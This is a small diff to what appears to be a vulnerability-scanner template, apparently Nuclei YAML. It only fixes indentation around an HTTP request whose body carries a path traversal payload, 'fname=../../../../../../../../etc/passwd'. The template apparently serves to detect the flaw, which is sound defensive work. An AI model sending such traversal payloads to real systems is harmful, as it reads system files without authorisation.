@@ -15,8 +15,8 @@ requests:
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
         Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
         Connection: close
-		
-		    yr=2021&mh=6&fname=../../../../../../../../etc/passwd
+        
+            yr=2021&mh=6&fname=../../../../../../../../etc/passwd
 
     matchers-condition: and
     matchers:
